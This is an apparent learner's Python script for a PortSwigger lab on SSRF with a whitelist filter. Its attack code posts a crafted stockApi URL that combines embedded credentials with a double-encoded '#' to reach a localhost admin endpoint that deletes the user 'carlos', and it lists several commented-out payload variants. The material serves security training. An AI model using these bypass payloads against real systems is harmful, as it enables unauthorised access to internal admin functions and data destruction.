# https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
host = "acd41fa61f0eb3bf8007ee4100b700aa.web-security-academy.net"
path = "/product/stock"
url = scheme + host + path
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
cookies = {"session": "VfgSSLVABYuxOEWWlt0pV1x5Pq3VAvO9"}


def get_hex_repr(s):
    hex_repr = ""
    for c in s:
        hex_repr += hex(ord(c)).replace("0x", "%")

    return hex_repr


def double_url_enc(s):
    hex_repr = ""
    for c in s:
        hex_repr += "%25"
        hex_repr += hex(ord(c)).replace("0x", "")

    return hex_repr

# payload = "http://localhost"
# payload = "http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = "http://username@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = "http://username#@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = "http://username%2523@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = "http://localhost:80%2523@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = f"http://localhost:80{double_url_enc('/admin/delete?username=carlos')}@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
# payload = f"http://localhost:80{double_url_enc('#')}@stock.weliketoshop.net:8080/admin/"
payload = f"http://localhost:80{get_hex_repr('/admin/delete?username=carlos')}{double_url_enc('#')}@stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1"
data = {"stockApi": payload}

requests.post(url, verify=verify, proxies=proxies, cookies=cookies, data=data)

# stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
# I could not figure out what the correct answer should be. Again, as with the previous challenge, the solution provided.
# Based on my understanding, the hashtag should render everything after it a fragment identifier (anchor tag)
# So i tried putting the delete path and parameters before the hashtag, but to no avail